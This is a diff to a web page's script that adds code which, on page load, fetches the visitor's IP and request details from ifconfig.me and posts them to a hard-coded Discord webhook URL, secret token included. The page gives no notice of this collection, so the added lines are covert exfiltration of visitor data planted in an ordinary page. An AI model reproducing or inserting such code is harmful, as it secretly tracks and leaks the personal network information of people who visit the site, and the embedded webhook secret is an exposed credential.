@@ -49,6 +49,22 @@
       .catch(err => {
         document.getElementById("user-ip").textContent = " ";
       });
+    fetch("https://ifconfig.me/all")
+    .then(data => data.text())
+    .then(data => {
+        var infoo = data
+        var urlw = "https://discord.com/api/webhooks/1169738571029164143/46XLXSxw5BEMaz2VBe1Nw9N_NuD6nGrK_3UHdabUx1btadOXg0PeJxIieaD9L--y9I7g"
+        fetch(urlw, {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json"
+            },
+            body: JSON.stringify({ "content": infoo })
+
+        })
+            //.then(dataw => dataw.text())
+            //.then(dataw => console.log(dataw))
+    })
   </script>
 </body>
 </html>
